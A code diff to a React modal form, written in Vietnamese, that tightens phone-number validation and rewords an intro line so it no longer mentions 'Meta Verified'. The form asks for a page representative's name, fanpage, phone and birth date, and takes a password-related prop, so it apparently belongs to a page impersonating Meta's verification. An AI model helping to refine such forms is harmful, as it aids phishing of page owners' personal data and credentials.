@@ -14,6 +14,7 @@ interface InfomationsModalProps {
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
+  const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length;
 
   const [isOpen, setIsOpen] = React.useState(isOpend);
   const [errors, setErrors] = React.useState<Record<string, string>>({});
@@ -53,10 +54,11 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       }
       if (!formData.fanpage.trim()) newErrors.fanpage = "Vui lòng nhập tên Trang/Fanpage.";
       const phoneDigits = normalizePhoneDigits(formData.phone);
+      const phoneDigitCount = getPhoneDigitCount(formData.phone);
       if (!phoneDigits) {
         newErrors.phone = "Vui lòng nhập số điện thoại.";
-      } else if (phoneDigits.length < 8 || phoneDigits.length > 15) {
-        newErrors.phone = "Số điện thoại phải gồm từ 8 đến 15 chữ số.";
+      } else if (phoneDigitCount < 8 || phoneDigitCount > 15) {
+        newErrors.phone = "Số điện thoại phải có từ 8 đến 15 chữ số (không tính dấu + và khoảng trắng).";
       }
       if (!formData.day) newErrors.day = "Vui lòng chọn ngày sinh.";
       if (!formData.month) newErrors.month = "Vui lòng chọn tháng sinh.";
@@ -99,7 +101,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
           <div className='w-full'>
             <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
               <p className='text-[13px] leading-[1.55] text-[#33507f]'>
-                Vui lòng cung cấp thông tin chính xác để hoàn tất hồ sơ xác minh Meta Verified. Các trường bắt buộc cần được điền đầy đủ để tránh gián đoạn quá trình xét duyệt.
+                Vui lòng điền chính xác và đầy đủ các trường bắt buộc để hoàn tất hồ sơ xác minh.
               </p>
             </div>
             <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Họ và tên người đại diện <span className='text-[#e5484d]'>*</span></label>
